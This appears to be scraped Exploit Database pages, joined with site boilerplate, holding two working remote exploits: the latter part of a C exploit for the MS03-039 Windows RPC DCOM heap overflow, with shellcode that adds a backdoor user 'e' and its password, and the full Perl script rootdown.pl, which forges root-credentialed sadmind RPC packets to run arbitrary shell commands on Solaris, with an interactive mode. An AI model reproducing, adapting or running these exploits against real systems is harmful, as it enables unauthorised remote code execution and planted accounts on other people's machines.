x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x3B,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x81,0xC5,0x17,0x03,0x80,0x0E,0xE9,0x4A,0x99,0x99,0xF1,0x8A,0x50,0x6F,0x7A,0x85,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x30,0x00,0x00,0x00,0x78,0x00,0x6E,0x00,0x00,0x00,0x00,0x00,0xD8,0xDA,0x0D,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x2F,0x0C,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x46,0x00,0x58,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x10,0x00,0x00,0x00,0x30,0x00,0x2E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x68,0x00,0x00,0x00,0x0E,0x00,0xFF,0xFF,0x68,0x8B,0x0B,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};unsigned char request2[]={0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x5C,0x00,0x5C,0x00};unsigned char request3[]={0x5C,0x00,0x43,0x00,0x24,0x00,0x5C,0x00,0x31,0x00,0x32,0x00,0x33,0x00,0x34,0x00,0x35,0x00,0x36,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x2E,0x00,0x64,0x00,0x6F,0x00,0x63,0x00,0x00,0x00};//user="e" pass="asd#321"unsigned char sc_add_user[]="\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x3E\x01\x80\x34\x0A\x99\xE2\xFA""\xEB\x05\xE8\xEB\xFF\xFF\xFF\x70\x31\x99\x99\x99\xC3\x21\x95\x69""\x64\xE6\x12\x99\x12\xE9\x85\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5""\x9A\x6A\x12\xEF\xE1\x9A\x6A\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA""\x74\xCF\xCE\xC8\x12\xA6\x9A\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED""\x91\xC0\xC6\x1A\x5E\x9D\xDC\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF""\xBD\x9A\x5A\x48\x78\x9A\x58\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A""\x5A\x58\x78\x9B\x9A\x58\x12\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F""\x97\x12\x49\xF3\x9A\xC0\x71\xBD\x99\x99\x99\xF1\x66\x66\x66\x99""\xF1\x99\x89\x99\x99\xF3\x9D\x66\xCE\x6D\x22\x81\x69\x64\xE6\x10""\x9A\x1A\x5F\x95\xAA\x59\xC9\xCF\x66\xCE\x61\xC9\x66\xCE\x65\xAA""\x59\x35\x1C\x59\xEC\x60\xC8\xCB\xCF\xCA\x66\x4B\xC3\xC0\x32\x7B""\x77\xAA\x59\x5A\x71\xCA\x66\x66\x66\xDE\xFC\xED\xC9\xEB\xF6\xFA""\xD8\xFD\xFD\xEB\xFC\xEA\xEA\x99\xD1\xFC\xF8\xE9\xDA\xEB\xFC\xF8""\xED\xFC\x99\xCE\xF0\xF7\xDC\xE1\xFC\xFA\x99\xDC\xE1\xF0\xED\xC9""\xEB\xF6\xFA\xFC\xEA\xEA\x99\xFA\xF4\xFD\xB9\xB6\xFA\xB9\xF7\xFC""\xED\xB9\xEC\xEA\xFC\xEB\xB9\xFC\xB9\xF8\xEA\xFD\xBA\xAA\xAB\xA8""\xB9\xB6\xF8\xFD\xFD\xB9\xBF\xBF\xB9\xF7\xFC\xED\xB9\xF5\xF6\xFA""\xF8\xF5\xFE\xEB\xF6\xEC\xE9\xB9\xF8\xFD\xF4\xF0\xF7\xF0\xEA\xED""\xEB\xF8\xED\xF6\xEB\xEA\xB9\xFC\xB9\xB6\xF8\xFD\xFD\x99";#define	sc_offset		0x24#define	sc_max			0x208#define	jmp_addr_offset	sc_max+sc_offset+0x8#define	top_seh_offset	jmp_addr_offset+0x4unsigned char sc[]="\x31\x00\x32\x00\x37\x00\x2e\x00\x30\x00\x2e\x00""\x30\x00\x2e\x00\x31\x00\x5c\x00\x49\x00\x50\x00""\x43\x00\x24\x00\x5c\xxe9\xf3\xfd\xff\xff""EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE";unsigned char request4[]={0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x20,0x00,0x00,0x00,0x30,0x00,0x2D,0x00,0x00,0x00,0x00,0x00,0x88,0x2A,0x0C,0x00,0x02,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x28,0x8C,0x0C,0x00,0x01,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00};struct{char	*os;DWORD	dwTopSeh;char	*seh;DWORD	dwJmpAddr;char	*jmp;}targets[] ={{ "2kEnSp4+MS03-026",0x7c54144c,"kernel32.dll v5.0.2195.6688",0x77a1b496,"OLEAUT32.dll v2.40.4522.0"},{ "2kEnSp3+SomeHotFixs+MS03-026",0x77eda1f0,"kernel32.dll v5.0.2195.6079",0x77a1afa9,"OLEAUT32.dll v2.40.4518.0"}}, v;void main(int argc,char ** argv){WSADATA WSAData;SOCKET sock;int len,len1;SOCKADDR_IN addr_in;short port=135;unsigned char buf1[0x1000];unsigned char buf2[0x1000];int	i, iType;printf( "MS03-039 RPC DCOM long filename heap buffer overflow exp v1\n""Base on flashsky's MS03-026 exp\n""Code by ey4s<eyas#xfocus.org>\n""2003-09-16\n""Welcome to http://www.xfocus.net\n""Thanks to flashsky & benjurry & Dave Aitel\n""If success, target will add a user \"e\" and password is \"asd#321\"\n\n");if(argc!=3){printf("Usage: %s <target> <type>\n", argv[0]);for(i = 0; i < sizeof(targets)/sizeof(v); i++)printf( "<%d>   %s\n""      TopSeh=0x%.8x in %s\n""      JmpAddr=0x%.8x in %s\n",i, targets[i].os,targets[i].dwTopSeh, targets[i].seh,targets[i].dwJmpAddr, targets[i].jmp);return;}iType = atoi(argv[2]);if((iType<0) || iType > sizeof(targets)/sizeof(v)){printf("[-] Wrong type.\n");return;}memcpy(&sc[sc_offset], sc_add_user, sizeof(sc_add_user));memcpy(&sc[jmp_addr_offset], &targets[iType].dwJmpAddr,4);memcpy(&sc[top_seh_offset], &targets[iType].dwTopSeh,4);printf("[+] Prepare shellcode completed.\n");if (WSAStartup(MAKEWORD(2,0),&WSAData)!=0){printf("WSAStartup error.Error:%d\n",WSAGetLastError());return;}addr_in.sin_family=AF_INET;addr_in.sin_port=htons(port);addr_in.sin_addr.S_un.S_addr=inet_addr(argv[1]);if ((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==INVALID_SOCKET){printf("Socket failed.Error:%d\n",WSAGetLastError());return;}if(WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR){printf("Connect failed.Error:%d",WSAGetLastError());return;}printf("[+] Connect to %s:135 success.\n", argv[1]);if(sizeof(sc_add_user) > sc_max){printf("[-] shellcode too long, exit.\n");return;}len=sizeof(sc);memcpy(buf2,request1,sizeof(request1));len1=sizeof(request1);*(DWORD *)(request2)=*(DWORD *)(request2)+sizeof(sc)/2;  //¼ÆËãÎÄ¼þÃûË«×Ö½Ú³¤¶È*(DWORD *)(request2+8)=*(DWORD *)(request2+8)+sizeof(sc)/2;//¼ÆËãÎÄ¼þÃûË«×Ö½Ú³¤¶Èmemcpy(buf2+len1,request2,sizeof(request2));len1=len1+sizeof(request2);memcpy(buf2+len1,sc,sizeof(sc));len1=len1+sizeof(sc);memcpy(buf2+len1,request3,sizeof(request3));len1=len1+sizeof(request3);memcpy(buf2+len1,request4,sizeof(request4));len1=len1+sizeof(request4);*(DWORD *)(buf2+8)=*(DWORD *)(buf2+8)+sizeof(sc)-0xc;//¼ÆËã¸÷ÖÖ½á¹¹µÄ³¤¶È*(DWORD *)(buf2+0x10)=*(DWORD *)(buf2+0x10)+sizeof(sc)-0xc;*(DWORD *)(buf2+0x80)=*(DWORD *)(buf2+0x80)+sizeof(sc)-0xc;*(DWORD *)(buf2+0x84)=*(DWORD *)(buf2+0x84)+sizeof(sc)-0xc;*(DWORD *)(buf2+0xb4)=*(DWORD *)(buf2+0xb4)+sizeof(sc)-0xc;*(DWORD *)(buf2+0xb8)=*(DWORD *)(buf2+0xb8)+sizeof(sc)-0xc;*(DWORD *)(buf2+0xd0)=*(DWORD *)(buf2+0xd0)+sizeof(sc)-0xc;*(DWORD *)(buf2+0x18c)=*(DWORD *)(buf2+0x18c)+sizeof(sc)-0xc;len = send(sock,bindstr,sizeof(bindstr),0);if(len<=0){printf("[-] Send failed.Error:%d\n",WSAGetLastError());return;}elseprintf("[+] send %d bytes.\n", len);len=recv(sock,buf1,1000,0);if(len<=0){printf("[-] recv error:%d\n", GetLastError());return;}elseprintf("[+] recv %d bytes.\n", len);len = send(sock,buf2,len1,0);if(len<=0){printf("[-] Send failed.Error:%d\n",WSAGetLastError());return;}elseprintf("[+] send %d bytes.\n", len);len=recv(sock,buf1,1024,0);if(len<=0){printf("[+] Target crash or exploit success? :)\n");}elseprintf("[-] recv %d bytes. Bad luck!\n", len);}// milw0rm.com [2003-09-16]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 101
Solaris Sadmind - Default Configuration Remote Code Execution - Solaris remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDSolaris Sadmind - Default Configuration Remote Code ExecutionEDB-ID:101CVE:2003-0722EDB Verified:Author:H D MooreType:remoteExploit:/Platform:SolarisDate:2003-09-19Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perl -w#####################      Title: rootdown.pl#      Purpose: Solaris Remote command executiong via sadmind#      Author: H D Moore hdm at metasploit.com#      Copyright: Copyright (C) 2003 METASPLOIT.COM##use strict;use POSIX;use IO::Socket;use IO::Select;use Getopt::Std;my $VERSION = "1.0";my %opts;getopts("h:p:c:r:iv", \%opts);if ($opts{v}) { show_info() }if (! $opts{h}) { usage() }my $target_host = $opts{h};my $target_name = "exploit";my $command = $opts{c} ? $opts{c} : "touch /tmp/OWNED_BY_SADMIND_\$\$";my $portmap = $opts{r} ? $opts{r} : 111;### Determine the port used by sadmind##my $target_port = $opts{p} ? $opts{p} : rpc_getport($target_host, $portmap, 100232, 10);if (! $target_port){print STDERR "Error: could not determine port used by sadmind\n";exit(0);}###  Determine the hostname of the target##my $s = rpc_socket($target_host, $target_port);my $x = rpc_sadmin_exec($target_name, "id");print $s $x;my $r = rpc_read($s);close ($s);if ($r && $r =~ m/Security exception on host (.*)\.  USER/){$target_name = $1;} else {print STDERR "Error: could not obtain target hostname.\n";exit(0);}###  Execute commands :)##my $interactive = 0;if ($opts{i}) { $interactive++ }do {if ($opts{i}) { $command = command_prompt() } else{print STDERR "Executing command on '$target_name' via port $target_port\n";}$s = rpc_socket($target_host, $target_port);$x = rpc_sadmin_exec($target_name, $command);print $s $x;$r = rpc_read($s);close ($s);if ($r){# Command Failedif (length($r) == 36 && substr($r, 24, 4) eq "\x00\x00\x00\x29"){print STDERR "Error: something went wrong with the RPC format.\n";exit(0);}# Command might have failedif (length($r) == 36 && substr($r, 24, 4) eq "\x00\x00\x00\x2b"){print STDERR "Error: something may have gone wrong with the sadmind format\n";}# Confirmed successif (length($r) == 36 && substr($r, 24, 12) eq ("\x00" x 12)){print STDERR "Success: your command has been executed successfully.\n";}if (length($r) != 36)  { print STDERR "Unknown Response: $r\n" }} else {print STDERR "Error: no response recieved, you may want to try again.\n";exit(0);}} while ($interactive);exit(0);sub usage {print STDERR "\n";print STDERR "+-----==[ rootdown.pl => Solaris SADMIND Remote Command Execution\n\n";print STDERR "       Usage:   $0 -h <target> -c <command> [options]\n";print STDERR "     Options:\n";print STDERR "                -i\tStart interactive mode (for multiple commands)\n";print STDERR "                -p\tAvoid the portmapper and use this sadmind port\n";print STDERR "                -r\tQuery alternate portmapper on this UDP port\n";print STDERR "                -v\tDisplay information about this exploit\n";print STDERR "\n\n";exit(0);}sub show_info {print "\n\n";print "   Name:  rootdown.pl\n";print " Author:  H D Moore <hdm\@metasploit.com>\n";print "Version:  $VERSION\n\n";# not finsihed :)print"This exploit targets a weakness in the default security settingsof the sadmind RPC application. This application is installed andenabled by default on most versions of the Solaris operatingsystem.\n\n"."The sadmind application defaults to a weak security mode known asAUTH_SYS (or AUTH_UNIX under Linux/BSD). When running in this mode,the service will accept a structure containing the user and groupIDs as well as the originating system name. These values are notvalidated in any form and are completely controlled by the client.If the standard sadmin RPC API calls are used to generate the request,the ADM_CLIENT_HOST parameter is filled in with the hostname of theclient system. If the RPC packet is modified so that this field isset to the hostname of the remote system, it will be processed asif it was a local request. If the user ID is set to zero or thevalue of any user in the sysadmin group, it is possible to callarbitrary methods in any class available to sadmind.\n\n"."If the Solstice AdminSuite client software has not been installed,the only class available is 'system', which only contains a singlemethod called 'admpipe'. The strings within this program seem tosuggest that it can be used run arbitrary commands, however I chosea different method of command execution. Since each method is simplyan executable in the class directory, it is possible to use astandard directory traversal attack to execute any application.We can pass arguments to these methods using the standard API.An example of spawning a shell which executes the 'id' command:# apm -c system -m ../../../../../bin/sh -a arg1=-c arg2=id\n\n"."To exploit this vulnerability, we must create a RPC packet thatcalls the '/bin/sh' method, passing it the parameter of the commandwe want to execute. To do this, packet dumps of the 'apm' toolwere obtained and the format was slowly mapped. The hostname ofthe target system must be known for this exploit to work, howeverwhen sadmind is called with the wrong name, it replies with a'ACCESS DENIED' error message containing the correct name. Thefinal code does the following:1) Queries the portmapper to determine the sadmind port2) Sends an invalid request to sadmind to obtain the hostname3) Uses the hostname to forge the RPC packet and execute commandsThis vulnerability was reported by Mark Zielinski and disclosed by iDefense.Related URLs:- http://www.idefense.com/advisory/09.16.03.txt- http://docs.sun.com/db/doc/816-0211/6m6nc676b?a=view";exit(0);}sub command_prompt {select(STDOUT); $|++;print STDOUT "\nsadmind> ";my $command = <STDIN>;chomp($command);if (! $command || lc($command) eq "quit" || lc($command) eq "exit"){print "\nExiting interactive mode...\n";exit(0);}return ($command)}sub rpc_socket {my ($target_host, $target_port) = @_;my $s = IO::Socket::INET->new(PeerAddr => $target_host,PeerPort => $target_port,Proto    => "udp",Type     => SOCK_DGRAM);if (! $s){print "\nError: could not create socket to target: $!\n";exit(0);}select($s); $|++;select(STDOUT); $|++;nonblock($s);return($s);}sub rpc_read {my ($s) = @_;my $sel = IO::Select->new($s);my $res;my @fds = $sel->can_read(4);foreach (@fds) { $res .= <$s>; }return $res;}sub nonblock {my ($fd) = @_;my $flags = fcntl($fd, F_GETFL,0);fcntl($fd, F_SETFL, $flags|O_NONBLOCK);}sub rpc_getport {my ($target_host, $target_port, $prog, $vers) = @_;my $s = rpc_socket($target_host, $target_port);my $portmap_req =pack("L", rand() * 0xffffffff) . # XID"\x00\x00\x00\x00".              # Call"\x00\x00\x00\x02".              # RPC Version"\x00\x01\x86\xa0".              # Program Number  (PORTMAP)"\x00\x00\x00\x02".              # Program Version (2)"\x00\x00\x00\x03".              # Procedure (getport)("\x00" x 16).                   # Credentials and Verifierpack("N", $prog) .pack("N", $vers).pack("N", 0x11).                 # Protocol: UDPpack("N", 0x00);                 # Port: 0print $s $portmap_req;my $r = rpc_read($s);close ($s);if (length($r) == 28){my $prog_port = unpack("N",substr($r, 24, 4));return($prog_port);}return undef;}sub rpc_sadmin_exec {my ($hostname, $command) = @_;my $packed_host = $hostname . ("\x00" x (59 - length($hostname)));my $rpc =pack("L", rand() * 0xffffffff) . # XID"\x00\x00\x00\x00".              # Call"\x00\x00\x00\x02".              # RPC Version"\x00\x01\x87\x88".              # Program Number  (SADMIND)"\x00\x00\x00\x0a".              # Program Version (10)"\x00\x00\x00\x01".              # Procedure"\x00\x00\x00\x01";              # Credentials (UNIX)# Auth Length is filled in# pad it up to multiples of 4my $rpc_hostname = $hostname;while (length($rpc_hostname) % 4 != 0) { $rpc_hostname .= "\x00" }my $rpc_auth =# Time Stamppack("N", time() + 20001) .# Machine Namepack("N", length($hostname)) . $rpc_hostname ."\x00\x00\x00\x00".              # UID = 0"\x00\x00\x00\x00".              # GID = 0"\x00\x00\x00\x00";              # No Extra Groups$rpc .= pack("N", length($rpc_auth)) . $rpc_auth . ("\x00" x 8);my $header =# Another Time Stampreverse(pack("L", time() + 20005)) ."\x00\x07\x45\xdf"."\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"."\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06"."\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"."\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x04"."\x7f\x00\x00\x01".                 # 127.0.0.1"\x00\x01\x87\x88".                 # SADMIND"\x00\x00\x00\x0a\x00\x00\x00\x04"."\x7f\x00\x00\x01".                 # 127.0.0.1"\x00\x01\x87\x88".                 # SADMIND"\x00\x00\x00\x0a\x00\x00\x00\x11\x00\x00\x00\x1e"."\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"."\x00\x00\x00\x00"."\x00\x00\x00\x3b". $packed_host."\x00\x00\x00\x00\x06" . "system"."\x00\x00\x00\x00\x00\x15". "../../../../../bin/sh". "\x00\x00\x00";# Append Body Length ^-- Heremy $body ="\x00\x00\x00\x0e". "ADM_FW_VERSION"."\x00\x00\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00"."\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00"."\x00\x00\x00\x08". "ADM_LANG"."\x00\x00\x00\x09\x00\x00\x00\x02\x00\x00"."\x00\x01". "C" ."\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"."\x00\x00\x00\x0d". "ADM_REQUESTID"."\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x12\x00\x00\x00\x11"."0810:1010101010:1"."\x00\x00\x00"."\x00\x00\x00\x00\x00\x00\x00\x00"."\x00\x00\x00\x09". "ADM_CLASS"."\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x07"."\x00\x00\x00\x06" . "system" ."\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"."\x00\x00\x00\x0e" . "ADM_CLASS_VERS" ."\x00\x00\x00\x00\x00\x09\x00\x00\x00\x04"."\x00\x00\x00\x03". "2.1"."\x00\x00\x00\x00\x00\x00\x00\x00\x00"."\x00\x00\x00\x0a" . "ADM_METHOD" ."\x00\x00\x00\x00\x00\x09\x00\x00\x00\x16"."\x00\x00\x00\x15". "../../../../../bin/sh" ."\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"."\x00\x00\x00\x08". "ADM_HOST" ."\x00\x00\x00\x09\x00\x00\x00\x3c\x00\x00\x00\x3b".$packed_host."\x00\x00\x00\x00\x00\x00\x00\x00\x00"."\x00\x00\x00\x0f". "ADM_CLIENT_HOST"."\x00\x00\x00\x00\x09".pack("N", length($hostname) + 1) .pack("N", length($hostname)) .$rpc_hostname ."\x00\x00\x00\x00". "\x00\x00\x00\x00"."\x00\x00\x00\x11" . "ADM_CLIENT_DOMAIN"."\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"."\x00\x00\x00\x00\x00\x00"."\x00\x00\x00\x11" . "ADM_TIMEOUT_PARMS"."\x00\x00\x00\x00\x00"."\x00\x09\x00\x00\x00\x1c"."\x00\x00\x00\x1b" . "TTL=0 PTO=20 PCNT=2 PDLY=30"."\x00\x00\x00\x00\x00\x00\x00\x00\x00"."\x00\x00\x00\x09" . "ADM_FENCE" ."\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00\x00\x00"."\x00\x00\x00\x00\x00\x00\x01\x58\x00\x00\x00\x00\x00\x00\x09\x00"."\x00\x00\x03\x00\x00\x00\x02" . "-c" ."\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x59\x00"."\x00\x00\x00\x00\x00\x09\x00\x00\x02\x01\x00\x00\x02\x00".$command . ("\x00" x (512 - length($command)))."\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10"."netmgt_endofargs";my $res = $rpc . $header . pack("N", (length($body) + 4 + length($header)) - 330) . $body;return($res);}# milw0rm.com [2003-09-19]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter 